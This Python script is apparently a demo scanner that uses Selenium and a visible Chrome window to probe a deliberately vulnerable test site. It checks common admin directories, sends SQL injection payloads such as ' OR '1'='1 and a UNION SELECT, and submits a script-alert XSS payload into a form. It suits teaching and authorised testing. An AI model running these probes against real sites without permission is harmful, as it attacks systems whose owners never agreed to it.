#!/usr/bin/env python3
"""
Simple Visual Penetration Testing Demo

This demonstrates real-time visual penetration testing where you can 
see the testing happening in the Chrome browser window.
"""

import asyncio
import sys
from pathlib import Path
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
import time

class VisualPenTest:
    def __init__(self):
        self.driver = None
        
    async def start_browser(self):
        """Start Chrome browser in visible mode"""
        chrome_options = Options()
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        # Don't add --headless so browser is visible
        chrome_options.add_argument("--window-size=1920,1080")
        
        service = Service(ChromeDriverManager().install())
        self.driver = webdriver.Chrome(service=service, options=chrome_options)
        
        print("🌐 Chrome browser started - you can now watch the testing!")
        
    async def visual_pentest(self, target_url):
        """Perform visual penetration testing"""
        
        print(f"\n🎯 REAL-TIME VISUAL PENETRATION TESTING")
        print(f"🎯 Target: {target_url}")
        print(f"📊 Watch the Chrome browser for live testing...")
        
        await self.start_browser()
        
        # Phase 1: Load target
        print(f"\n🔍 Phase 1: Loading target website...")
        self.driver.get(target_url)
        print(f"  ✅ Loaded {target_url}")
        await asyncio.sleep(3)  # Let user see the page
        
        # Phase 2: Directory testing
        print(f"\n🔍 Phase 2: Testing common directories...")
        directories = ["/admin", "/login", "/wp-admin", "/phpmyadmin", "/uploads"]
        
        for directory in directories:
            test_url = f"{target_url.rstrip('/')}{directory}"
            print(f"  🔗 Testing: {test_url}")
            
            self.driver.get(test_url)
            await asyncio.sleep(2)  # Let user see the result
            
            page_source = self.driver.page_source
            if "404" not in page_source and "Not Found" not in page_source:
                print(f"  ✅ Found accessible directory: {test_url}")
            else:
                print(f"  ❌ Directory not accessible")
        
        # Phase 3: SQL Injection testing
        print(f"\n💉 Phase 3: Testing SQL Injection...")
        sql_payloads = ["' OR '1'='1", "admin'--", "' UNION SELECT NULL--"]
        
        for i, payload in enumerate(sql_payloads):
            test_url = f"{target_url}?id={payload}"
            print(f"  🎯 Testing SQL payload {i+1}: {payload}")
            
            self.driver.get(test_url)
            await asyncio.sleep(3)  # Let user see the response
            
            page_source = self.driver.page_source.lower()
            if any(error in page_source for error in ["sql syntax", "mysql_fetch", "warning: mysql"]):
                print(f"  🚨 POTENTIAL SQL INJECTION VULNERABILITY!")
            else:
                print(f"  ✅ No obvious SQL errors")
        
        # Phase 4: XSS testing
        print(f"\n🚨 Phase 4: Testing for XSS...")
        
        # Go back to main page
        self.driver.get(target_url)
        await asyncio.sleep(2)
        
        # Find input fields
        inputs = self.driver.find_elements("tag name", "input")
        if inputs:
            print(f"  📝 Found {len(inputs)} input fields")
            
            xss_payload = "<script>alert('XSS-Test')</script>"
            print(f"  🎯 Testing XSS payload: {xss_payload}")
            
            try:
                input_field = inputs[0]
                input_field.clear()
                input_field.send_keys(xss_payload)
                
                # Try to find and click submit button
                submit_buttons = self.driver.find_elements("css selector", "input[type='submit'], button")
                if submit_buttons:
                    print(f"  📤 Submitting XSS payload...")
                    submit_buttons[0].click()
                    await asyncio.sleep(3)
                    
                    # Check for alert
                    try:
                        alert = self.driver.switch_to.alert
                        if alert:
                            print(f"  🚨 XSS VULNERABILITY CONFIRMED! Alert appeared!")
                            alert.accept()
                        else:
                            print(f"  ✅ No XSS alert detected")
                    except:
                        print(f"  ✅ No XSS alert detected")
                        
            except Exception as e:
                print(f"  ⚠️  Error testing XSS: {e}")
        else:
            print(f"  ℹ️  No input fields found for XSS testing")
        
        # Final display
        print(f"\n🎉 Visual penetration testing completed!")
        print(f"🖥️  The browser will stay open so you can see the final state")
        print(f"📋 Press Enter to close browser and exit...")
        
        # Keep browser open for user to see results
        input()
        
        self.driver.quit()

async def main():
    """Main function"""
    target_url = "http://testphp.vulnweb.com/"
    
    pentester = VisualPenTest()
    await pentester.visual_pentest(target_url)

if __name__ == "__main__":
    asyncio.run(main())
